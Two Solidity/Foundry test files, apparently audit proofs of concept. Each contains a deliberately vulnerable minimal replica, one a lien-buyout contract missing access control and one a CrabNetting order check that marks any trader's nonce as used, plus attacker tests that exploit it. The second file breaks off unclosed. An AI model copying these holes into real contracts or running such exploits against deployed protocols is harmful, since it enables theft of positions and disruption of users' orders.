pragma solidity 0.8.20;

import "forge-std/Test.sol";

// Minimal shared structs
struct Incoming {
    DummyToken tokenContract;
    uint256 tokenId;
}
struct LienDetails {
    uint256 maxAmount;
    uint256 rate;
    uint32 duration;
}
struct Lien {
    uint256 amount;
    uint32 start;
    uint32 last;
    uint240 rate;
    uint32 duration;
    bool active;
    address payee;
}
struct LienActionBuyout {
    Incoming incoming;
    address receiver;
    uint8 position;
}

contract DummyToken {
    function computeId(uint256) external pure returns (uint256) { return 1; }
}

contract Router {
    function validateCommitment(Incoming calldata) external pure returns (bool, LienDetails memory) {
        return (true, LienDetails({maxAmount: type(uint256).max, rate: 1, duration: 100}));
    }
    function isValidRefinance(Lien calldata, LienDetails calldata) external pure returns (bool) { return true; }
    function getBuyoutFee(uint256) external pure returns (uint256) { return 0; }
}

contract TransferProxy {
    function tokenTransferFrom(address, address, address, uint256) external pure {}
}

// Minimal vulnerable replica (inline)
contract LienToken {
    Router public ASTARIA_ROUTER;
    TransferProxy public TRANSFER_PROXY;
    address public WETH;

    mapping(uint256 => uint256[]) public liens;
    mapping(uint256 => Lien) public lienData;
    mapping(uint256 => address) public owners;

    constructor(Router router, TransferProxy proxy, address _weth, address initialOwner) {
        ASTARIA_ROUTER = router;
        TRANSFER_PROXY = proxy;
        WETH = _weth;

        // create a single lien at collateralId 1, position 0, lienId 123
        uint256 collateralId = 1;
        uint256 lienId = 123;
        liens[collateralId].push(lienId);
        lienData[lienId] = Lien({amount: 100, start: uint32(block.timestamp), last: uint32(block.timestamp), rate: 1, duration: 100, active: true, payee: address(0)});
        owners[lienId] = initialOwner;
    }

    function ownerOf(uint256 id) public view returns (address) { return owners[id]; }
    function _transfer(address, address to, uint256 id) internal { owners[id] = to; }
    function getPayee(uint256 id) public view returns (address) { return lienData[id].payee; }

    function getBuyout(uint256 collateralId, uint8 position) public view returns (uint256, uint256) {
        uint256 lienId = liens[collateralId][position];
        Lien memory lien = lienData[lienId];
        uint256 owed = lien.amount;
        uint256 fee = ASTARIA_ROUTER.getBuyoutFee(0);
        return (owed, owed + fee);
    }

    // vulnerable function: missing access control allowing anyone to buyout and become owner
    function buyoutLien(LienActionBuyout calldata params) external {
        (bool valid, LienDetails memory ld) = ASTARIA_ROUTER.validateCommitment(params.incoming);
        require(valid, "InvalidTerms");

        uint256 collateralId = params.incoming.tokenContract.computeId(params.incoming.tokenId);
        (uint256 owed, uint256 buyout) = getBuyout(collateralId, params.position);
        uint256 lienId = liens[collateralId][params.position];

        require(ld.maxAmount >= owed, "InvalidBuyoutDetails");
        require(ASTARIA_ROUTER.isValidRefinance(lienData[lienId], ld), "InvalidRefinance");

        TRANSFER_PROXY.tokenTransferFrom(WETH, msg.sender, getPayee(lienId), buyout);

        lienData[lienId].last = uint32(block.timestamp);
        lienData[lienId].start = uint32(block.timestamp);
        lienData[lienId].rate = uint240(ld.rate);
        lienData[lienId].duration = ld.duration;

        _transfer(ownerOf(lienId), params.receiver, lienId);
    }
}

contract LienTokenTest is Test {
    LienToken target;
    Router router;
    TransferProxy proxy;
    DummyToken token;
    address attacker = makeAddr("attacker");
    address initialOwner = address(0xBEEF);

    function setUp() public {
        router = new Router();
        proxy = new TransferProxy();
        token = new DummyToken();
        target = new LienToken(router, proxy, address(1), initialOwner);
    }

    function test_attacker_exploits_buyoutLien() public {
        LienActionBuyout memory p = LienActionBuyout({incoming: Incoming({tokenContract: token, tokenId: 1}), receiver: attacker, position: 0});
        vm.prank(attacker);
        target.buyoutLien(p);
        assertEq(target.ownerOf(123), attacker);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";

contract CrabNetting {
    struct Order { address trader; uint256 nonce; }
    mapping(address => mapping(uint256 => bool)) public nonces;
    event NonceTrue(address sender, uint256 nonce);

    function checkOrder(Order memory _order) external {
        return _checkOrder(_order);
    }

    function _checkOrder(Order memory _order) internal {
        // Vulnerable behavior: marks the provided trader's nonce as used
        _useNonce(_order.trader, _order.nonce);
        // (real contract also verifies signature/expiry; omitted here)
    }

    function _useNonce(address trader, uint256 nonce) internal {
        nonces[trader][nonce] = true;
        emit NonceTrue(trader, nonce);
    }
}

contract CrabNettingTest is Test {
    CrabNetting target;
    address attacker;
    address victim;

    function setUp() public {
        target = new CrabNetting();
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");
    }

    function test_attacker_exploits_checkOrder() public {
        vm.prank(attacker);
        CrabNetting.Order memory ord = CrabNetting.Order({trader: victim, nonce: 42});
        target.checkOrder(ord);
        // attacker was able to mark victim's nonce as used
        assertEq(target.nonces(victim, 42), true);
    }
